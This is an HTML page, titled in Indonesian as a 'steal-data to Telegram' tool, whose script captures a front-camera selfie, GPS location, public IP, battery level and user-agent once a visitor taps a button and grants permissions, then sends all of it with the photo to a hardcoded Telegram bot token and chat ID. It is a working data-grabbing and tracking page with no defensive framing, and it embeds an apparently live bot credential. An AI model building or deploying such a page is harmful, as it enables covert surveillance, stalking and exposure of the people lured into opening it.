<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<title>Curi-Data ‚Üí Telegram</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:system-ui;background:#111;color:#eee;padding:20px;text-align:center}
button{padding:14px 28px;font-size:18px;border:none;border-radius:8px;background:#0088ff;color:#fff}
canvas{display:none}
img{max-width:100%;border-radius:8px;margin-top:10px}
pre{background:#222;padding:10px;border-radius:6px;text-align:left;font-size:13px;white-space:pre-wrap}
</style>
</head>
<body>

<h2>Tap tombol ‚Üí izinkan kamera & lokasi</h2>
<button id="start">Kirim data ke Telegram</button>

<video id="video" autoplay muted playsinline></video>
<canvas id="canvas"></canvas>
<img id="preview">

<pre id="log">Menunggu‚Ä¶</pre>

<script>
/* ---------- CONFIG ---------- */
const TOKEN   = '8102671545:AAEbT25jA8_n9136iT7YlbUQQueFAXaj9T4';
const CHAT_ID = '7274253936';

/* ---------- ELEMEN ---------- */
const startBtn = document.getElementById('start');
const video    = document.getElementById('video');
const canvas   = document.getElementById('canvas');
const preview  = document.getElementById('preview');
const logBox   = document.getElementById('log');

/* ---------- EVENT ---------- */
startBtn.onclick = async () => {
  startBtn.disabled = true;
  logBox.textContent = 'Memulai‚Ä¶';

  try {
    /* 1. FOTO SELFIE ------------------------------------------ */
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' }
    });
    video.srcObject = stream;
    await video.play();

    canvas.width  = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    const fotoBase64 = canvas.toDataURL('image/jpeg', 0.8);
    preview.src = fotoBase64;
    stream.getTracks().forEach(t => t.stop());

    /* 2. LOKASI ----------------------------------------------- */
    const pos = await new Promise((res,rej) =>
      navigator.geolocation.getCurrentPosition(res, rej, {timeout:10000})
    );
    const {latitude:lat, longitude:lon, accuracy:acc} = pos.coords;

    /* 3. IP PUBLIK -------------------------------------------- */
    const ipres = await fetch('https://api.ipify.org?format=json');
    const {ip} = await ipres.json();

    /* 4. BATERAI + USER-AGENT --------------------------------- */
    let bat = 'Tidak support';
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      bat = `${(battery.level*100).toFixed(0)}% ${battery.charging?'(charging)':''}`;
    }
    const ua = navigator.userAgent;

    /* 5. KIRIM KE TELEGRAM ------------------------------------ */
    const caption =
      `üì∏ *Selfie baru masuk!*\n\n` +
      `üìç Lokasi: [Google Maps](https://www.google.com/maps?q=${lat},${lon})\n` +
      `üéØ Accuracy: ${acc.toFixed(0)} m\n` +
      `üåê IP: ${ip}\n` +
      `üîã Baterai: ${bat}\n` +
      `üì± User-Agent: \
 $$${ua}\$$ `;

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('caption', caption);
    form.append('parse_mode', 'MarkdownV2');
    form.append('photo', dataURItoBlob(fotoBase64), 'selfie.jpg');

    const upres = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form
    });
    const ok = upres.ok;
    logBox.textContent = ok ? '‚úÖ Sukses terkirim ke Telegram!' : '‚ùå Gagal kirim: ' + upres.status;
  } catch (e) {
    logBox.textContent = '‚ùå Error: ' + e.message;
  } finally {
    startBtn.disabled = false;
  }
};

/* ---------- UTIL ---------- */
function dataURItoBlob(dataURI){
  const byte = atob(dataURI.split(',')[1]);
  const ab = new ArrayBuffer(byte.length);
  const ia = new Uint8Array(ab);
  for(let i=0;i<byte.length;i++) ia[i]=byte.charCodeAt(i);
  return new Blob([ab],{type:'image/jpeg'});
}
</script>
</body>
</html>
